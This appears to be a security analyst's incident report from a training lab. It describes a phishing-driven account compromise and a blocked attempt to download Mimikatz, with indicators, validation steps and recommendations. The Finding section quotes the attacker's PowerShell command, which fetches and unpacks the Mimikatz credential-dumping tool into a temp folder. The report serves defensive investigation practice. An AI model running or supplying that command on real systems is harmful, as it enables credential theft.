# Finding

* Time: Jan 27, 2026, 12:12:13 PM UTC
* Device: myohset-vm
* Host: 172.16.0.4
* User: Jenny Smith
* User Account : jenny@30dayproject[.]onmicrosoft[.]com
* Melicious IP: 167.179.90.72
* Melicious IP Country : Japan
* Executed PowerShell Command :  iwr "hxxps[://github[.com/gentilkiwi/mimikatz/releases/download/2[.]2[.]0-20220919/mimikatz_trunk[.]zip" -Outfile "$env:TEMP\mimikatz.zip"; Expand-Archive "$env:TEMP\mimikatz.zip" -DestinationPath "$env:TEMP\mimikatz_extracted" -Force
- Alert: Hands-on keyboard attack launched from a compromised account
- Investigation Status: Remediated
- Automated Investigation and Response: Status changed from New to Resolved on Jan 27, 2026, 12:22:53 PM UTC
- Suspicious Folder Path: c:\users\jennysmith\appdata\local\temp\mimikatz_extracted\
- Suspicious File Name : c:\users\jennysmith\appdata\local\temp\mimikatz.zip

# Investigation
On January 27, 2026 (UTC), Microsoft XDR generated an alert indicating that a hands-on keyboard attack was launched from the compromised account of Jenny Smith on host myohset-vm.
The investigation confirmed that Jenny Smith’s account was compromised through a phishing email sent from the attacker identity Endy Eanny: endyganny@protonmail[.]com.User confirmed that he/she entered their username and password on the phishing link. After gaining access, the attacker attempted to download and execute Mimikatz to harvest credentials from the device. Microsoft Defender for Endpoint detected the malicious activity, contained the threat, and automatically remediated the device.

-  Who : Activity occurred on the host with IP address 172.16.0.4, associated with the user account jenny@30dayproject[.]onmicrosoft[.]com.
-  What : The attacker downloaded a credential‑harvesting tool (Mimikatz) after gaining access to the compromised host.
-  When : Based on Microsoft XDR alerts and the user’s report, the activity occurred between January 27, 2026, 11:28 AM and 12:48 PM (UTC). Microsoft XDR took the necessary automated actions, and the SOC team verified the remediation.
- WHERE : The malicious activity took place on the computer with IP 172.16.0.4, under the compromised user account jenny@30dayproject[.]onmicrosoft[.]com.
- Why : The attacker attempted to harvest credentials from the compromised host.
- How: : The user clicked a link in a phishing email, entered her credentials, and her account was compromised. Using the stolen credentials, the attacker accessed the host and downloaded the malicious tool Mimikatz to execute on the machine.

### Check the Image below

*    Alert
<img width="1641" height="817" alt="Screenshot 2026-01-27 131019" src="https://github.com/user-attachments/assets/d5481c8d-ce13-414a-ada2-1e615adfd5f1" />

   * Suspicious Sign In
<img width="1622" height="627" alt="Screenshot 2026-01-27 131838" src="https://github.com/user-attachments/assets/26941d2e-5e13-4d36-840e-5d894d405314" />

*    Powershell Executed Script
<img width="813" height="151" alt="Screenshot 2026-01-27 132908" src="https://github.com/user-attachments/assets/c16e8af7-24c0-4073-80e7-fb53ca448a04" />



# Validation Steps

1. Enter a Live Response session on the affected device.
2. Navigate to: c:\users\jennysmith\appdata\local\temp\mimikatz_extracted\ and c:\users\jennysmith\appdata\local\temp\
3. Verify that the folder mimikatz_extracted and all related files have been removed.
4. Confirm no remaining artifacts such as mimikatz.zip or extracted binaries.
5. And Check the Successful remidiation on XDR.

<img width="657" height="121" alt="Screenshot 2026-01-27 124741" src="https://github.com/user-attachments/assets/ce49543c-fd41-4020-ba1a-a9860680765c" />
<img width="1324" height="392" alt="image" src="https://github.com/user-attachments/assets/c21303c7-e9d3-4202-93ee-cc80288cd6cb" />

# Additional Findings

* A domain-wide query identified two users who received the phishing email.
* The malicious domain and sender were blocked, and appropriate actions were taken.
* Phishing Details:
* Source IP: 109.224.244.25
* Sender Email: endyganny@protonmail[.]com (Enddy Eanny)
* Display Name: Endy Eanny
* Subject: Invoice is Ready for Viewing - 3748291
* Recipients:	bob@30dayproject[.]onmicrosoft[.]com , jenny@30dayproject[.]onmicrosoft[.]com
* User Actions:	Bob: Reported the email as phishing and Jenny: Clicked the link, resulting in account compromise

<img width="1592" height="702" alt="Screenshot 2026-01-27 131335" src="https://github.com/user-attachments/assets/462f2cb3-f69f-4c60-a800-7f430d7f2212" />

<img width="756" height="338" alt="Screenshot 2026-01-27 143339" src="https://github.com/user-attachments/assets/6b4feb36-9f17-491d-8694-da91f6056bb6" />


# Recommendations

- Continue monitoring Jenny Smith’s account for unusual activity.
- Enforce password reset and MFA revalidation for affected users.
- Conduct phishing awareness training for all employees.
- Review email filtering rules to strengthen detection of similar phishing attempts.
- Validate that no additional persistence mechanisms or lateral movement occurred.
- Ensure all endpoints have the latest security updates and Defender signatures.
- Perform a full system scan using Microsoft Defender Antivirus on the compromised device to verify that no additional malware, credential‑harvesting tools, or persistence mechanisms are present.


  



